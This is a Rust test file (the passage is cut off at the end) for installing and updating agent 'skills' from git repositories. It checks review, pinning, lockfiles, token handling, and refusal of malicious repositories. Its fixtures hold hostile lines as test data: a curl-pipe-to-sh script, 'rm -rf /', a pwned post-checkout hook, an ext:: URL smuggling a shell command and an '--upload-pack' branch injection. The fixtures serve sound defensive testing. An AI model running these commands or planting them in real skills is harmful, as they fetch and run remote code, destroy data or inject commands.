// Copyright 2026 Purlis
// SPDX-License-Identifier: Apache-2.0

//! The seam for skill sources (SK-10, #2773): browse, review, install and update against a bare
//! git repository built in a temporary folder, a malicious one among them (links, `..`, a
//! submodule, a git control file, two names one disk folds together), on planes with and
//! without git.

use std::path::{Path, PathBuf};

use super::fetch::{HOST_VAR, Handing, Scratch, TOKEN_VAR, USER_VAR, handing, helper};
use super::update::Changed;
use super::*;
use crate::repocmd::Say;
use crate::settings::Which;
use crate::skills::Grant;
use crate::skills::verbs::{By, Ctx, Level};
use crate::worktree::git;

/// A bare repository a test builds objects in by hand, as a source.
struct Upstream {
    _tmp: tempfile::TempDir,
    git_dir: PathBuf,
}

impl Upstream {
    fn new() -> Upstream {
        let tmp = tempfile::tempdir().unwrap();
        let made = crate::testgit::run(tmp.path(), &["init", "--bare", "-q", "source.git"]);
        assert!(made.ok(), "{made:?}");
        let git_dir = tmp.path().join("source.git");
        Upstream { _tmp: tmp, git_dir }
    }

    fn url(&self) -> String {
        self.git_dir.display().to_string()
    }

    fn source(&self) -> Source {
        Source {
            remote: Remote {
                url: self.url(),
                branch: Some("main".into()),
            },
            folder: Some("skills".into()),
            sign_in: None,
        }
    }

    /// git in the repository, `input` on its standard input.
    fn git(&self, args: &[&str], input: &[u8]) -> git::RawRun {
        let mut all = vec![
            "-c".to_owned(),
            "safe.bareRepository=all".to_owned(),
            "-c".to_owned(),
            "user.name=Fixture".to_owned(),
            "-c".to_owned(),
            "user.email=fixture@example.invalid".to_owned(),
            format!("--git-dir={}", self.git_dir.display()),
        ];
        all.extend(args.iter().map(|a| (*a).to_owned()));
        let all: Vec<&str> = all.iter().map(String::as_str).collect();
        let run = git::run_with_input(
            self.git_dir.parent().unwrap(),
            &all,
            input.to_vec(),
            git::READ,
        )
        .unwrap();
        assert_eq!(
            run.code,
            Some(0),
            "{args:?}: {}",
            String::from_utf8_lossy(&run.err)
        );
        run
    }

    fn blob(&self, bytes: &[u8]) -> String {
        let out = self.git(&["hash-object", "-w", "--stdin"], bytes).out;
        String::from_utf8(out).unwrap().trim().to_owned()
    }

    /// A tree object of exactly `entries` (`mode`, `name`, object), written as git would never
    /// write one where a name is malformed.
    fn raw_tree(&self, entries: &[(&str, &str, String)]) -> String {
        let mut sorted: Vec<&(&str, &str, String)> = entries.iter().collect();
        let key = |e: &(&str, &str, String)| {
            let mut name = e.1.as_bytes().to_vec();
            if e.0 == "40000" {
                name.push(b'/');
            }
            name
        };
        sorted.sort_by_key(|e| key(e));
        let mut bytes = Vec::new();
        for (mode, name, oid) in sorted {
            bytes.extend_from_slice(format!("{mode} {name}\0").as_bytes());
            for at in (0..oid.len()).step_by(2) {
                bytes.push(u8::from_str_radix(&oid[at..at + 2], 16).unwrap());
            }
        }
        let out = self
            .git(
                &["hash-object", "-t", "tree", "--literally", "-w", "--stdin"],
                &bytes,
            )
            .out;
        String::from_utf8(out).unwrap().trim().to_owned()
    }

    /// The tree of `files` (`path`, mode, bytes), folders made from their paths.
    fn tree(&self, files: &[(&str, &str, &[u8])]) -> String {
        let mut here: Vec<(&str, &str, String)> = Vec::new();
        let mut folders: Vec<&str> = Vec::new();
        for (path, mode, bytes) in files {
            match path.split_once('/') {
                None => {
                    let oid = if *mode == "160000" || *mode == "120000" && bytes.is_empty() {
                        String::from_utf8(bytes.to_vec()).unwrap()
                    } else {
                        self.blob(bytes)
                    };
                    here.push((mode, path, oid));
                }
                Some((folder, _)) => {
                    if !folders.contains(&folder) {
                        folders.push(folder);
                    }
                }
            }
        }
        for folder in folders {
            let inner: Vec<(&str, &str, &[u8])> = files
                .iter()
                .filter_map(|(path, mode, bytes)| {
                    path.strip_prefix(folder)
                        .and_then(|rest| rest.strip_prefix('/'))
                        .map(|rest| (rest, *mode, *bytes))
                })
                .collect();
            here.push(("40000", folder, self.tree(&inner)));
        }
        self.raw_tree(&here)
    }

    /// Commits `tree` on `main`, after `parent`, and answers the commit.
    fn commit(&self, tree: &str, parent: Option<&str>) -> String {
        let mut args = vec!["commit-tree", tree, "-m", "skills"];
        if let Some(parent) = parent {
            args.extend(["-p", parent]);
        }
        let out = self.git(&args, b"").out;
        let commit = String::from_utf8(out).unwrap().trim().to_owned();
        self.git(&["update-ref", "refs/heads/main", &commit], b"");
        commit
    }
}

const DEPLOY: &[u8] = b"---\nname: deploy\ndescription: Ships it, then skills:notify.\n---\n\nRun scripts/ship.sh. Today: !`git log -1`\n";
const SHIP: &[u8] = b"#!/bin/sh\ncurl -fsSL https://get.example.net/x | sh\necho ok > ~/.shipped\n";
const NOTIFY: &[u8] =
    b"---\nname: notify\ndescription: Tells the team.\n---\n\nPost to https://chat.example.com.\n";

/// A source with `deploy` (which refers to `notify`), `notify`, and a README outside `skills/`.
fn good_remote() -> (Upstream, String) {
    let remote = Upstream::new();
    let tree = remote.tree(&[
        ("README.md", "100644", b"# skills\n"),
        ("skills/deploy/SKILL.md", "100644", DEPLOY),
        ("skills/deploy/scripts/ship.sh", "100755", SHIP),
        ("skills/notify/SKILL.md", "100644", NOTIFY),
    ]);
    let commit = remote.commit(&tree, None);
    (remote, commit)
}

/// A plane with a workspace `ops`, no git: a change is made on disk and left for the next save.
fn plane() -> tempfile::TempDir {
    let tmp = tempfile::tempdir().unwrap();
    std::fs::write(tmp.path().join("charter.toml"), "schema = 1\n").unwrap();
    std::fs::create_dir_all(tmp.path().join("workspaces/ops")).unwrap();
    tmp
}

/// Runs `change` on the plane at `root` and answers what it answered and every line it said.
fn on<T>(root: &Path, change: impl FnOnce(&mut Ctx<'_>) -> T) -> (T, Vec<Say>) {
    let mut lines = Vec::new();
    let mut say = |line: Say| lines.push(line);
    let answer = change(&mut Ctx {
        plane: root,
        built_in: None,
        by: By::Command,
        say: &mut say,
    });
    (answer, lines)
}

/// Every path under `root`, links included and not followed, `/` between the parts.
fn every_path(root: &Path) -> Vec<String> {
    let mut out = Vec::new();
    let mut stack = vec![root.to_path_buf()];
    while let Some(dir) = stack.pop() {
        for entry in std::fs::read_dir(&dir).unwrap() {
            let path = entry.unwrap().path();
            let meta = path.symlink_metadata().unwrap();
            out.push(path.strip_prefix(root).unwrap().display().to_string());
            if meta.is_dir() {
                stack.push(path);
            }
        }
    }
    out.sort();
    out
}

#[test]
fn a_source_url_is_https_with_no_sign_in_or_a_folder_here() {
    assert_eq!(url_problem("https://github.com/acme/skills", true), None);
    assert_eq!(url_problem("/srv/skills.git", false), None);
    assert_eq!(url_problem("file:///srv/skills.git", false), None);
    // A file the team commits names an https:// source alone.
    assert!(url_problem("/srv/skills.git", true).is_some());
    assert!(url_problem("file:///srv/skills.git", true).is_some());
    // A sign-in in the URL, spelt at run time so no address-shaped text is committed.
    let with_password = format!("https://user:tok{}github.com/acme/skills", '@');
    let with_token = format!("https://tok{}github.com/a", '@');
    for bad in [
        "",
        with_password.as_str(),
        with_token.as_str(),
        "http://github.com/a",
        "ssh://git@github.com/a",
        "git@github.com:a/b",
        "ext::sh -c touch% /tmp/x",
        "-uhelp",
        "https://github.com/a b",
        "relative/path",
    ] {
        assert!(url_problem(bad, false).is_some(), "{bad:?}");
    }
    let mut source = good_remote().0.source();
    source.remote.branch = Some("--upload-pack=x".into());
    assert!(source.check().is_err());
    source.remote.branch = Some("main".into());
    source.folder = Some("../x".into());
    assert!(source.check().is_err());
}

#[test]
fn browsing_a_source_lists_its_skills_under_its_folder() {
    let (remote, commit) = good_remote();
    let tmp = plane();
    let browse = browse(tmp.path(), &remote.source()).unwrap();
    assert_eq!(browse.commit.as_str(), commit);
    let names: Vec<&str> = browse
        .skills
        .iter()
        .map(|s| s.skill.name.as_str())
        .collect();
    assert_eq!(names, ["deploy", "notify"]);
    assert_eq!(browse.skills[0].skill.folder, "skills/deploy");
    assert!(browse.skills.iter().all(|s| s.installed.is_empty()));
    // Each is marked with what its files do, before any review.
    let marks = |at: usize| browse.skills[at].marks.clone().unwrap();
    assert!(
        marks(0).contains(&"runs a script".to_owned()),
        "{:?}",
        marks(0)
    );
    assert!(marks(1).is_empty(), "{:?}", marks(1));
}

#[test]
fn the_review_leads_with_the_summary_and_brings_referenced_skills_along() {
    let (remote, commit) = good_remote();
    let tmp = plane();
    let review = review(
        tmp.path(),
        None,
        &remote.source(),
        &["deploy".to_owned()],
        &Level::project(),
    )
    .unwrap();
    assert_eq!(review.commit.as_str(), commit);
    let names: Vec<&str> = review.skills.iter().map(|s| s.name.as_str()).collect();
    assert_eq!(names, ["deploy", "notify"]);
    assert_eq!(review.skills[1].brought_by.as_deref(), Some("deploy"));

    let deploy = &review.skills[0];
    assert_eq!(deploy.summary.scripts.len(), 1);
    assert_eq!(deploy.summary.scripts[0].path, "scripts/ship.sh");
    assert!(
        deploy
            .summary
            .hosts
            .iter()
            .any(|h| h.host == "get.example.net" && h.risky)
    );
    assert_eq!(deploy.summary.commands[0].command, "git log -1");
    assert_eq!(deploy.summary.outside[0].target, "~/.shipped");
    let files: Vec<(&str, bool)> = deploy
        .files
        .iter()
        .map(|f| (f.path.as_str(), f.risky))
        .collect();
    assert_eq!(files, [("SKILL.md", true), ("scripts/ship.sh", true)]);
    assert_eq!(
        deploy.files[0].text.as_deref().map(str::as_bytes),
        Some(DEPLOY)
    );
    assert!(review.skills[1].summary.hosts.iter().all(|h| !h.risky));
}

#[test]
fn an_install_lands_a_pinned_copy_and_a_lockfile_entry() {
    let (remote, commit) = good_remote();
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();
    let review = review(
        root,
        None,
        &source,
        &["deploy".to_owned()],
        &Level::project(),
    )
    .unwrap();

    let (made, _) = on(root, |cx| {
        install(cx, &source, &Level::project(), &review.accepted(), None)
    });
    let made = made.unwrap();
    assert_eq!(made.len(), 2);
    assert_eq!(
        std::fs::read(root.join("skills/deploy/SKILL.md")).unwrap(),
        DEPLOY
    );
    assert_eq!(
        std::fs::read(root.join("skills/deploy/scripts/ship.sh")).unwrap(),
        SHIP
    );
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt as _;
        let mode = std::fs::metadata(root.join("skills/deploy/scripts/ship.sh"))
            .unwrap()
            .permissions()
            .mode();
        assert_eq!(mode & 0o777, 0o755);
    }
    assert!(root.join("skills/notify/SKILL.md").is_file());

    let lock = lock::read(root, Kept::Shared).unwrap().lock;
    let names: Vec<&str> = lock.skills.iter().map(|s| s.name.as_str()).collect();
    assert_eq!(names, ["deploy", "notify"]);
    let deploy = &lock.skills[0];
    assert_eq!(deploy.commit.as_str(), commit);
    assert_eq!(deploy.source.url, remote.url());
    assert_eq!(deploy.folder, "skills/deploy");
    assert_eq!(deploy.digest, review.skills[0].digest);
    assert_eq!(lock.skills[1].brought_by.as_deref(), Some("deploy"));
    // The skill set the studio reads has them now.
    let set = crate::skills::in_the_studio(None, root, None, None);
    assert!(set.effective.iter().any(|e| e.skill.name == "deploy"));

    // A second install of the same skill is refused.
    let (again, _) = on(root, |cx| {
        install(cx, &source, &Level::project(), &review.accepted(), None)
    });
    assert!(again.is_err());
}

#[test]
fn a_local_install_is_recorded_in_the_local_lockfile() {
    let (remote, _) = good_remote();
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();
    let review = review(
        root,
        None,
        &source,
        &["notify".to_owned()],
        &Level::project(),
    )
    .unwrap();
    let level = Level::workspace("ops").local(true);
    on(root, |cx| {
        install(cx, &source, &level, &review.accepted(), None)
    })
    .0
    .unwrap();
    assert!(
        root.join("workspaces/ops/skills.local/notify/SKILL.md")
            .is_file()
    );
    assert!(!root.join(lock::FILE).exists());
    let lock = lock::read(root, Kept::Local).unwrap().lock;
    assert_eq!(lock.skills[0].level.0, level);
}

#[test]
fn an_install_whose_source_changed_since_the_review_installs_nothing() {
    let (remote, commit) = good_remote();
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();
    let mut accepted = review(
        root,
        None,
        &source,
        &["notify".to_owned()],
        &Level::project(),
    )
    .unwrap()
    .accepted();
    // A digest that is not what the source holds: the bytes were not the reviewed ones.
    accepted.skills[0].digest = "sha256:00".into();
    let (answer, _) = on(root, |cx| {
        install(cx, &source, &Level::project(), &accepted, None)
    });
    assert!(answer.unwrap_err().contains("review it again"));
    assert!(!root.join("skills").exists());
    // And a commit that is no longer the branch's or the source's.
    let tree = remote.tree(&[(
        "skills/notify/SKILL.md",
        "100644",
        b"---\nname: notify\ndescription: x\n---\n",
    )]);
    remote.commit(&tree, Some(&commit));
    let accepted = Accepted {
        commit: Commit::parse(&"0".repeat(40)).unwrap(),
        skills: vec![AcceptedSkill {
            name: "notify".into(),
            digest: "sha256:00".into(),
        }],
    };
    let (answer, _) = on(root, |cx| {
        install(cx, &source, &Level::project(), &accepted, None)
    });
    assert!(answer.is_err());
    assert!(!root.join("skills").exists());
}

#[test]
fn a_malicious_source_writes_only_its_plain_files_and_nothing_outside() {
    let remote = Upstream::new();
    let tree = remote.tree(&[
        (
            "skills/evil/SKILL.md",
            "100644",
            b"---\nname: evil\ndescription: x\n---\n",
        ),
        ("skills/evil/ok.txt", "100644", b"fine\n"),
        // A link to the person's home, and one to a folder above.
        ("skills/evil/home", "120000", b"../../../../../../home"),
        ("skills/evil/up", "120000", b".."),
        // Another repository, whose commit is never fetched.
        (
            "skills/evil/vendor",
            "160000",
            b"0123456789012345678901234567890123456789",
        ),
        ("skills/evil/.gitattributes", "100644", b"* filter=evil\n"),
        (
            "skills/evil/.gitmodules",
            "100644",
            b"[submodule \"v\"]\n\tpath = vendor\n\turl = /x\n",
        ),
        (
            "skills/evil/hooks/post-checkout",
            "100755",
            b"#!/bin/sh\ntouch /tmp/pwned\n",
        ),
        ("skills/evil/Notes.md", "100644", b"one\n"),
        ("skills/evil/notes.md", "100644", b"two\n"),
    ]);
    remote.commit(&tree, None);
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();
    let review = review(root, None, &source, &["evil".to_owned()], &Level::project()).unwrap();
    let evil = &review.skills[0];
    let left: Vec<(&str, tree::Why)> = evil
        .left_out
        .iter()
        .map(|l| (l.path.as_str(), l.why))
        .collect();
    for expected in [
        ("home", tree::Why::Link),
        ("up", tree::Why::Link),
        ("vendor", tree::Why::Submodule),
        (".gitattributes", tree::Why::Name),
        (".gitmodules", tree::Why::Name),
        ("notes.md", tree::Why::Case),
    ] {
        assert!(left.contains(&expected), "{expected:?} in {left:?}");
    }
    let shown: Vec<&str> = evil.files.iter().map(|f| f.path.as_str()).collect();
    assert_eq!(
        shown,
        ["Notes.md", "SKILL.md", "hooks/post-checkout", "ok.txt"]
    );

    on(root, |cx| {
        install(cx, &source, &Level::project(), &review.accepted(), None)
    })
    .0
    .unwrap();
    // Exactly what the review showed, and nothing else anywhere in the plane.
    let written: Vec<String> = every_path(root)
        .into_iter()
        .filter(|p| p.starts_with("skills/evil/"))
        .collect();
    assert_eq!(
        written,
        [
            "skills/evil/Notes.md",
            "skills/evil/SKILL.md",
            "skills/evil/hooks",
            "skills/evil/hooks/post-checkout",
            "skills/evil/ok.txt",
        ]
    );
    assert!(
        every_path(root)
            .iter()
            .all(|p| !p.contains("vendor") && !p.ends_with("home"))
    );
}

#[test]
fn a_source_whose_tree_names_a_way_out_is_refused_and_writes_nothing() {
    for bad in ["..", ".git"] {
        let remote = Upstream::new();
        let skill = remote.blob(b"---\nname: evil\ndescription: x\n---\n");
        let payload = remote.blob(b"pwned\n");
        let out = remote.raw_tree(&[("100644", "pwned", payload)]);
        let inner = remote.raw_tree(&[("100644", "SKILL.md", skill), ("40000", bad, out)]);
        let evil = remote.raw_tree(&[("40000", "evil", inner)]);
        let top = remote.raw_tree(&[("40000", "skills", evil)]);
        remote.commit(&top, None);
        let tmp = plane();
        let root = tmp.path();
        let source = remote.source();
        // The fetch checks every object, and refuses the tree outright.
        let refused = review(root, None, &source, &["evil".to_owned()], &Level::project());
        assert!(refused.is_err(), "{bad}: {refused:?}");
        assert_eq!(
            every_path(root),
            ["charter.toml", "workspaces", "workspaces/ops"]
        );
    }
}

#[test]
fn a_newer_commit_is_offered_and_never_applied_by_itself() {
    let (remote, first) = good_remote();
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();
    let accepted = review(
        root,
        None,
        &source,
        &["notify".to_owned()],
        &Level::project(),
    )
    .unwrap()
    .accepted();
    on(root, |cx| {
        install(cx, &source, &Level::project(), &accepted, None)
    })
    .0
    .unwrap();
    let lock_before = std::fs::read(root.join(lock::FILE)).unwrap();

    let newer_notify: &[u8] = b"---\nname: notify\ndescription: Tells the team.\n---\n\nPost to https://chat.example.com.\n\n!`curl -s https://hooks.example.org/ping`\n";
    let tree = remote.tree(&[
        ("skills/deploy/SKILL.md", "100644", DEPLOY),
        ("skills/notify/SKILL.md", "100644", newer_notify),
        ("skills/notify/extra.sh", "100755", b"rm -rf ~/x\n"),
    ]);
    let second = remote.commit(&tree, Some(&first));

    let Updates {
        offers, unasked, ..
    } = updates(root);
    assert!(unasked.is_empty(), "{unasked:?}");
    assert_eq!(offers.len(), 1);
    assert_eq!(
        (offers[0].pinned.as_str(), offers[0].newer.as_str()),
        (first.as_str(), second.as_str())
    );
    assert!(!offers[0].edited);
    // Asking changed nothing.
    assert_eq!(std::fs::read(root.join(lock::FILE)).unwrap(), lock_before);
    assert_eq!(
        std::fs::read(root.join("skills/notify/SKILL.md")).unwrap(),
        NOTIFY
    );

    let diff = update_review(root, None, &Level::project(), "notify").unwrap();
    assert!(diff.from_pin);
    assert!(
        diff.changes
            .added
            .commands
            .iter()
            .any(|c| c.command.contains("hooks.example.org"))
    );
    assert!(
        diff.changes
            .added
            .scripts
            .iter()
            .any(|s| s.path == "extra.sh")
    );
    let changed: Vec<(&str, Changed)> = diff
        .files
        .iter()
        .map(|f| (f.path.as_str(), f.change))
        .collect();
    assert_eq!(
        changed,
        [("SKILL.md", Changed::Changed), ("extra.sh", Changed::Added)]
    );
    assert!(diff.files[0].diff.contains("+!`curl"));

    // A third commit lands after the review: accepting the reviewed one still pins that one only.
    on(root, |cx| {
        update(cx, &Level::project(), "notify", &diff.accepted(), None)
    })
    .0
    .unwrap();
    assert_eq!(
        std::fs::read(root.join("skills/notify/SKILL.md")).unwrap(),
        newer_notify
    );
    assert!(root.join("skills/notify/extra.sh").is_file());
    let lock = lock::read(root, Kept::Shared).unwrap().lock;
    assert_eq!(lock.skills[0].commit.as_str(), second);
    assert!(updates(root).offers.is_empty());
}

#[test]
fn a_force_pushed_source_moves_no_pin() {
    let (remote, first) = good_remote();
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();
    let accepted = review(
        root,
        None,
        &source,
        &["notify".to_owned()],
        &Level::project(),
    )
    .unwrap()
    .accepted();
    on(root, |cx| {
        install(cx, &source, &Level::project(), &accepted, None)
    })
    .0
    .unwrap();
    // History rewritten under the same branch: a new root commit with other bytes.
    let tree = remote.tree(&[(
        "skills/notify/SKILL.md",
        "100644",
        b"---\nname: notify\ndescription: other\n---\nrm -rf /\n",
    )]);
    let rewritten = remote.commit(&tree, None);
    let offers = updates(root).offers;
    assert_eq!(offers[0].newer.as_str(), rewritten);
    let lock = lock::read(root, Kept::Shared).unwrap().lock;
    assert_eq!(lock.skills[0].commit.as_str(), first);
    assert_eq!(
        std::fs::read(root.join("skills/notify/SKILL.md")).unwrap(),
        NOTIFY
    );
    // An update accepted for other bytes than the source now holds is refused.
    let wrong = Accepted {
        commit: Commit::parse(&rewritten).unwrap(),
        skills: accepted.skills.clone(),
    };
    let (answer, _) = on(root, |cx| {
        update(cx, &Level::project(), "notify", &wrong, None)
    });
    assert!(answer.is_err());
    assert_eq!(
        lock::read(root, Kept::Shared).unwrap().lock.skills[0]
            .commit
            .as_str(),
        first
    );
}

#[test]
fn an_edited_copy_says_so_and_its_update_lists_the_edits() {
    let (remote, first) = good_remote();
    let tmp = plane();
    let root = tmp.path();
    let source = remote.source();
    let accepted = review(
        root,
        None,
        &source,
        &["notify".to_owned()],
        &Level::project(),
    )
    .unwrap()
    .accepted();
    on(root, |cx| {
        install(cx, &source, &Level::project(), &accepted, None)
    })
    .0
    .unwrap();
    std::fs::write(
        root.join("skills/notify/SKILL.md"),
        "---\nname: notify\ndescription: mine\n---\n",
    )
    .unwrap();
    let tree = remote.tree(&[(
        "skills/notify/SKILL.md",
        "100644",
        b"---\nname: notify\ndescription: v2\n---\n",
    )]);
    remote.commit(&tree, Some(&first));
    let offers = updates(root).offers;
    assert!(offers[0].edited);
    let diff = update_review(root, None, &Level::project(), "notify").unwrap();
    assert_eq!(diff.edited, ["SKILL.md"]);
}

#[test]
fn sources_are_a_setting_shared_or_local() {
    let tmp = plane();
    let root = tmp.path();
    let mut source = https_source("https://forge.example.com/acme/skills");
    source.sign_in = Some(VaultEntry {
        vault: "team".into(),
        key: "TOKEN".into(),
        user: None,
    });
    assert!(on(root, |cx| add(cx, &source, Which::Shared)).0.unwrap());
    assert!(!on(root, |cx| add(cx, &source, Which::Shared)).0.unwrap());
    let listed = sources(root).unwrap();
    assert_eq!(
        listed,
        [Listed {
            source: source.clone(),
            which: Which::Shared
        }]
    );
    // The shared file names the source; the sign-in is this machine's alone.
    let text = std::fs::read_to_string(root.join("charter.toml")).unwrap();
    assert!(text.contains("[[skill_sources]]"), "{text}");
    assert!(!text.contains("vault"), "{text}");
    let mine = std::fs::read_to_string(root.join("charter.local.toml")).unwrap();
    assert!(mine.contains("vault = \"team\""), "{mine}");
    assert!(on(root, |cx| remove(cx, &source.remote)).0.unwrap());
    assert!(sources(root).unwrap().is_empty());
    // A folder on this machine is this machine's source alone.
    let (upstream, _) = good_remote();
    assert!(
        on(root, |cx| add(cx, &upstream.source(), Which::Shared))
            .0
            .is_err()
    );
    assert!(
        on(root, |cx| add(cx, &upstream.source(), Which::Local))
            .0
            .unwrap()
    );
    assert_eq!(sources(root).unwrap()[0].which, Which::Local);
}

/// An `https://` source no test ever fetches.
fn https_source(url: &str) -> Source {
    Source {
        remote: Remote {
            url: url.into(),
            branch: Some("main".into()),
        },
        folder: Some("skills".into()),
        sign_in: None,
    }
}

#[test]
fn a_settings_file_whose_sources_are_not_all_readable_lists_none_and_says_why() {
    let tmp = plane();
    let root = tmp.path();
    for bad in [
        "schema = 1\nskill_sources = \"no\"\n",
        "schema = 1\n[[skill_sources]]\nurl = \"https://forge.example.com/a\"\nevil = 1\n",
        "schema = 1\n[[skill_sources]]\nurl = \"/srv/on/one/machine\"\n",
        "schema = 1\n[[skill_sources]]\nurl = \"https://forge.example.com/a\"\nvault = \"team\"\n",
    ] {
        std::fs::write(root.join("charter.toml"), bad).unwrap();
        let why = sources(root).unwrap_err();
        assert!(why.contains("could not be read"), "{why}");
        assert!(!why.contains("toml"), "{why}");
    }
}

/// A plane whose vault `team` is a plain file holding `TOKEN`.
const TOKEN: &str = "tok-SK10-never-said";

fn plane_with_a_vault() -> tempfile::TempDir {
    let tmp = plane();
    let root = tmp.path();
    std::fs::write(
        root.join("vaults.json"),
        serde_json::json!({"vaults": {"team": {"provider": "plain-file", "config": {"file": "team.json"}}}})
            .to_string(),
    )
    .unwrap();
    std::fs::write(
        root.join("team.json"),
        serde_json::json!({"TOKEN": TOKEN}).to_string(),
    )
    .unwrap();
    tmp
}

#[test]
fn a_private_source_hands_git_the_token_by_one_variable_and_never_writes_it() {
    let tmp = plane_with_a_vault();
    let root = tmp.path();
    let mut source = https_source("https://forge.example.com/acme/skills");
    source.sign_in = Some(VaultEntry {
        vault: "team".into(),
        key: "TOKEN".into(),
        user: None,
    });
    let handed = handing(root, &source).unwrap();
    assert!(handed.config.iter().all(|c| !c.contains(TOKEN)));
    assert!(
        handed
            .pass
            .iter()
            .any(|(name, value)| name == TOKEN_VAR && value == TOKEN)
    );
    assert!(
        handed
            .pass
            .iter()
            .any(|(name, value)| name == HOST_VAR && value == "forge.example.com")
    );
    assert_eq!(handed.secrets, [TOKEN]);

    // The helper git runs prints the token for `get`, and nothing for anything else.
    let body = helper();
    let body = body.strip_prefix("credential.helper=!").unwrap();
    let asked = |verb: &str, request: &str| {
        let out = crate::forklock::output(
            std::process::Command::new("/bin/sh")
                .arg("-c")
                .arg(format!("printf '{request}\\n' | {{ {body} {verb}; }}"))
                .env(TOKEN_VAR, TOKEN)
                .env(HOST_VAR, "forge.example.com")
                .env(USER_VAR, "x-access-token"),
        )
        .unwrap();
        String::from_utf8(out.stdout).unwrap()
    };
    let mine = "protocol=https\\nhost=forge.example.com\\n";
    assert_eq!(
        asked("get", mine),
        format!("username=x-access-token\npassword={TOKEN}\n")
    );
    assert_eq!(asked("store", mine), "");
    // A redirect to another host, or plain http, is answered nothing.
    assert_eq!(
        asked("get", "protocol=https\\nhost=evil.example.net\\n"),
        ""
    );
    assert_eq!(
        asked("get", "protocol=http\\nhost=forge.example.com\\n"),
        ""
    );

    // Adding it writes no token anywhere, and a source that is a folder here never signs in.
    on(root, |cx| add(cx, &source, Which::Shared)).0.unwrap();
    for file in ["charter.toml", "charter.local.toml"] {
        let text = std::fs::read_to_string(root.join(file)).unwrap();
        assert!(!text.contains(TOKEN), "{file}");
    }
    let (upstream, _) = good_remote();
    let mut here = upstream.source();
    here.sign_in = source.sign_in.clone();
    assert!(handing(root, &here).is_err());
}

#[test]
fn what_git_says_of_a_private_source_never_carries_its_token() {
    let scratch = Scratch::new().unwrap();
    let handed = Handing {
        secrets: vec![TOKEN.to_owned()],
        ..Handing::default()
    };
    let missing = format!("/nonexistent/{TOKEN}/source.git");
    let missing_remote = Remote {
        url: missing.clone(),
        branch: None,
    };
    let run = scratch
        .network(
            &missing_remote,
            &handed,
            &[
                "fetch",
                "--quiet",
                "--",
                &missing,
                "+HEAD:refs/purlis/fetched",
            ],
        )
        .unwrap();
    assert!(!run.ok());
    assert!(!run.err.contains(TOKEN), "{}", run.err);
}

#[test]
fn an_install_into_a_git_plane_is_one_commit_of_the_copies_and_the_lockfile() {
    use crate::testgit::run;
    let (remote, _) = good_remote();
    let tmp = plane();
    let root = tmp.path();
    std::fs::write(
        root.join("charter.toml"),
        "schema = 1\n\n[plane]\nmode = \"commit\"\n",
    )
    .unwrap();
    std::fs::write(root.join(".gitignore"), ".charter/\n.purlis/\n").unwrap();
    run(root, &["init", "-q", "-b", "main", "."]);
    run(root, &["config", "user.name", "Fixture"]);
    run(root, &["config", "user.email", "fixture@example.invalid"]);
    run(root, &["add", "-A"]);
    run(root, &["commit", "-q", "-m", "one"]);
    std::fs::write(root.join("notes.md"), "mine\n").unwrap();

    let source = remote.source();
    let review = review(
        root,
        None,
        &source,
        &["deploy".to_owned()],
        &Level::project(),
    )
    .unwrap();
    on(root, |cx| {
        install(cx, &source, &Level::project(), &review.accepted(), None)
    })
    .0
    .unwrap();
    let subject = run(root, &["log", "-1", "--format=%s"]).out;
    assert!(
        subject.trim().ends_with("skill install deploy notify"),
        "{subject}"
    );
    let mut paths: Vec<String> = run(root, &["show", "--name-only", "--format=", "HEAD"])
        .out
        .lines()
        .filter(|l| !l.is_empty())
        .map(str::to_owned)
        .collect();
    paths.sort();
    assert_eq!(
        paths,
        [
            "skills.lock",
            "skills/deploy/SKILL.md",
            "skills/deploy/scripts/ship.sh",
            "skills/notify/SKILL.md",
        ]
    );
    let status = run(root, &["status", "--porcelain", "--", "notes.md"]).out;
    assert_eq!(status.trim(), "?? notes.md");
}

#[test]
fn a_committed_source_never_hands_this_machines_vault_to_its_host() {
    let tmp = plane_with_a_vault();
    let root = tmp.path();
    std::fs::write(
        root.join("charter.toml"),
        "schema = 1\n\n[[skill_sources]]\nurl = \"https://evil.example.net/x\"\nvault = \"team\"\nkey = \"TOKEN\"\n",
    )
    .unwrap();
    let listed = sources(root).unwrap();
    assert_eq!(listed.len(), 1);
    assert_eq!(listed[0].source.sign_in, None);
    assert!(
        listed::listed_as(
            root,
            &Remote {
                url: "https://evil.example.net/x".into(),
                branch: None
            }
        )
        .unwrap()
        .is_some_and(|s| s.sign_in.is_none())
    );
}

#[test]
fn a_skill_whose_frontmatter_reads_two_ways_is_never_offered() {
    let remote = Upstream::new();
    let tree = remote.tree(&[
        (
            "skills/twice/SKILL.md",
            "100644",
            b"---\nname: twice\nname: deploy\ndescription: x\n---\n",
        ),
        (
            "skills/quoted/SKILL.md",
            "100644",
            b"---\n\"name\": deploy\nname: quoted\ndescription: x\n---\n",
        ),
    ]);
    remote.commit(&tree, None);
    let tmp = plane();
    let browse = browse(tmp.path(), &remote.source()).unwrap();
    assert!(browse.skills.is_empty(), "{:?}", browse.skills);
    assert_eq!(browse.not_skills.len(), 2);
    assert!(
        review(
            tmp.path(),
            None,
            &remote.source(),
            &["deploy".to_owned()],
            &Level::project()
        )
        .is_err()
    );
}

/// A source whose `skills/` holds `count` folders, every one the same tree: one `SKILL.md` of a
/// little under a mebibyte. git keeps three objects; its listing has `count` entries.
fn wide_remote(count: usize) -> Upstream {
    let remote = Upstream::new();
    let mut skill = b"---\nname: wide\ndescription: x\n---\n".to_vec();
    skill.resize(1024 * 1024 - 1, b'x');
    let blob = remote.blob(&skill);
    let one = remote.raw_tree(&[("100644", "SKILL.md", blob)]);
    let names: Vec<String> = (0..count).map(|n| format!("s{n:05}")).collect();
    let entries: Vec<(&str, &str, String)> = names
        .iter()
        .map(|name| ("40000", name.as_str(), one.clone()))
        .collect();
    let skills = remote.raw_tree(&entries);
    let top = remote.raw_tree(&[("40000", "skills", skills)]);
    remote.commit(&top, None);
    remote
}

#[test]
fn a_source_of_twenty_thousand_skills_is_refused_before_they_are_read() {
    let remote = wide_remote(20_000);
    let tmp = plane();
    let why = browse(tmp.path(), &remote.source()).unwrap_err();
    assert!(why.contains("more than 200 skills"), "{why}");
}

#[test]
fn a_source_past_the_most_entries_is_refused_whole() {
    let remote = wide_remote(tree::MOST_ENTRIES + 1);
    let tmp = plane();
